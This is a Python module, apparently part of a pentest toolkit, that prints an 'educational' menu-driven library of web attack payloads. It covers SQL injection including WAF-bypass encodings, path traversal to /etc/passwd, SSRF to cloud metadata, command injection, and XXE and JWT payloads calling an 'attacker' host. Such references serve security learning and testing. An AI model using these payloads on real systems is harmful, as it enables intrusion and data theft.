#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Payload Reference Library (EDUCATIONAL)
Cuma tampilkan referensi payload — tidak melakukan eksekusi.
Untuk pembelajaran & dokumentasi.
"""
from utils.colors import C, section, label, info, warn


# ==========================================================
#  Reference data
# ==========================================================
SQLI_UNION = [
    ("Basic marker",        "' UNION SELECT 1,2,3-- -"),
    ("NULL padding",        "' UNION SELECT NULL,NULL,NULL-- -"),
    ("Version query",       "' UNION SELECT @@version,2,3-- -"),
    ("Current DB",          "' UNION SELECT database(),2,3-- -"),
    ("Current user",        "' UNION SELECT user(),2,3-- -"),
    ("List tables",         "' UNION SELECT GROUP_CONCAT(table_name),2,3 "
                            "FROM information_schema.tables "
                            "WHERE table_schema=database()-- -"),
    ("List columns",        "' UNION SELECT GROUP_CONCAT(column_name),2,3 "
                            "FROM information_schema.columns "
                            "WHERE table_name='users'-- -"),
]

SQLI_ORDER_BY = [
    ("Column count test 1",  "' ORDER BY 1-- -"),
    ("Column count test 2",  "' ORDER BY 2-- -"),
    ("Column count test 3",  "' ORDER BY 3-- -"),
    ("Column count test 5",  "' ORDER BY 5-- -"),
    ("Column count test 10", "' ORDER BY 10-- -"),
]

SQLI_BOOLEAN = [
    ("True condition",   "' AND '1'='1"),
    ("False condition",  "' AND '1'='2"),
    ("Numeric true",     "' AND 1=1-- -"),
    ("Numeric false",    "' AND 1=2-- -"),
    ("Subquery true",    "' AND (SELECT 1)=1-- -"),
]

SQLI_TIME = [
    ("MySQL SLEEP",      "' AND SLEEP(5)-- -"),
    ("MySQL BENCHMARK",  "' AND BENCHMARK(5000000,MD5('a'))-- -"),
    ("PostgreSQL",       "'; SELECT PG_SLEEP(5)-- -"),
    ("MSSQL WAITFOR",    "'; WAITFOR DELAY '0:0:5'-- -"),
    ("Oracle",           "' AND dbms_pipe.receive_message(('a'),5)-- -"),
]

SQLI_WAF_BYPASS = [
    ("Comment split",    "'/**/UNION/**/SELECT/**/1,2,3-- -"),
    ("Case mix",         "' UnIoN SeLeCt 1,2,3-- -"),
    ("Tab separator",    "'%09UNION%09SELECT%091,2,3-- -"),
    ("URL encode",       "%27%20UNION%20SELECT%201,2,3--%20-"),
    ("Double encode",    "%2527%2520UNION%2520SELECT-- -"),
]

DBMS_FINGERPRINT = [
    ("MySQL",        "@@version / version()"),
    ("MariaDB",      "@@version / version()"),
    ("MSSQL",        "@@version"),
    ("PostgreSQL",   "version()"),
    ("Oracle",       "banner FROM v$version"),
    ("SQLite",       "sqlite_version()"),
]

NOSQL_REFERENCE = [
    ("MongoDB $gt",      '{"$gt":""}'),
    ("MongoDB $ne",      '{"$ne":null}'),
    ("MongoDB $regex",   '{"$regex":".*"}'),
    ("PHP array ne",     '[$ne]=1'),
    ("PHP array gt",     '[$gt]='),
]

PATH_TRAVERSAL = [
    ("Unix passwd",      "../../../../etc/passwd"),
    ("Windows ini",      "..\\..\\..\\..\\windows\\win.ini"),
    ("URL encoded",      "..%2f..%2f..%2f..%2fetc%2fpasswd"),
    ("Double encoded",   "..%252f..%252f..%252fetc%252fpasswd"),
    ("Null byte",        "../../../../etc/passwd%00"),
]

SSTI_REFERENCE = [
    ("Jinja2 basic",     "{{7*7}}"),
    ("Jinja2 config",    "{{config}}"),
    ("Freemarker",       "${7*7}"),
    ("Twig",             "{{7*7}}"),
    ("ERB",              "<%= 7*7 %>"),
    ("Polyglot",         "{{7*7}}${7*7}#{7*7}"),
]

SSRF_REFERENCE = [
    ("Localhost",        "http://127.0.0.1/"),
    ("Localhost name",   "http://localhost/"),
    ("AWS metadata",     "http://169.254.169.254/latest/meta-data/"),
    ("GCP metadata",     "http://metadata.google.internal/"),
    ("File scheme",      "file:///etc/passwd"),
    ("Gopher redis",     "gopher://127.0.0.1:6379/_INFO"),
]

COMMAND_INJECTION = [
    ("Semicolon",        "; whoami"),
    ("Pipe",             "| whoami"),
    ("AND",              "&& whoami"),
    ("OR",               "|| whoami"),
    ("Backtick",         "`whoami`"),
    ("Dollar paren",     "$(whoami)"),
]

XXE_REFERENCE = [
    ("File read",        '<?xml version="1.0"?><!DOCTYPE foo ['
                         '<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                         '<root>&xxe;</root>'),
    ("SSRF via XXE",     '<?xml version="1.0"?><!DOCTYPE foo ['
                         '<!ENTITY xxe SYSTEM "http://attacker/">]>'
                         '<root>&xxe;</root>'),
]

JWT_REFERENCE = [
    ("alg:none",         '{"alg":"none","typ":"JWT"}'),
    ("kid traversal",    '{"alg":"HS256","kid":"../../etc/passwd"}'),
    ("jku abuse",        '{"alg":"RS256","jku":"http://attacker/jwks.json"}'),
]


# ==========================================================
#  Display
# ==========================================================
def _show(title, data):
    section(title)
    for label_, val in data:
        print(f"  {C.BCYN}▸ {label_}{C.RST}")
        print(f"    {C.DIM}{val}{C.RST}")
    print()


def run(_prompt_target):
    print(f"  {C.BLD}{C.BCYN}◈  PAYLOAD REFERENCE LIBRARY{C.RST}")
    print(f"  {C.DIM}Educational only — referensi payload, tidak dieksekusi.{C.RST}")
    print()

    print(f"  {C.BLD}{C.HI}Pilih kategori:{C.RST}")
    print(f"    {C.BCYN}[1]{C.RST}  SQLi — UNION SELECT")
    print(f"    {C.BCYN}[2]{C.RST}  SQLi — ORDER BY")
    print(f"    {C.BCYN}[3]{C.RST}  SQLi — Boolean based")
    print(f"    {C.BCYN}[4]{C.RST}  SQLi — Time based")
    print(f"    {C.BCYN}[5]{C.RST}  SQLi — WAF bypass")
    print(f"    {C.BCYN}[6]{C.RST}  DBMS Fingerprint")
    print(f"    {C.BCYN}[7]{C.RST}  NoSQL Injection")
    print(f"    {C.BCYN}[8]{C.RST}  Path Traversal / LFI")
    print(f"    {C.BCYN}[9]{C.RST}  SSTI (Template Injection)")
    print(f"    {C.BCYN}[10]{C.RST} SSRF")
    print(f"    {C.BCYN}[11]{C.RST} Command Injection")
    print(f"    {C.BCYN}[12]{C.RST} XXE")
    print(f"    {C.BCYN}[13]{C.RST} JWT Attacks")
    print(f"    {C.BCYN}[14]{C.RST} Semua")
    print()

    ch = input(f"  {C.BCYN}[?]{C.RST} Pilih [1-14] : ").strip()

    mapping = {
        "1":  ("SQLi — UNION SELECT", SQLI_UNION),
        "2":  ("SQLi — ORDER BY", SQLI_ORDER_BY),
        "3":  ("SQLi — Boolean Based", SQLI_BOOLEAN),
        "4":  ("SQLi — Time Based", SQLI_TIME),
        "5":  ("SQLi — WAF Bypass", SQLI_WAF_BYPASS),
        "6":  ("DBMS Fingerprint", DBMS_FINGERPRINT),
        "7":  ("NoSQL Injection", NOSQL_REFERENCE),
        "8":  ("Path Traversal / LFI", PATH_TRAVERSAL),
        "9":  ("SSTI (Template Injection)", SSTI_REFERENCE),
        "10": ("SSRF", SSRF_REFERENCE),
        "11": ("Command Injection", COMMAND_INJECTION),
        "12": ("XXE", XXE_REFERENCE),
        "13": ("JWT Attacks", JWT_REFERENCE),
    }

    if ch == "14":
        for title, data in mapping.values():
            _show(title, data)
    elif ch in mapping:
        title, data = mapping[ch]
        _show(title, data)
    else:
        warn("Pilihan tidak valid.")
        return

    print()
    print(f"  {C.BYEL}[!]{C.RST} {C.DIM}Referensi ini cuma untuk pembelajaran. "
          f"Jangan pakai tanpa izin.{C.RST}")
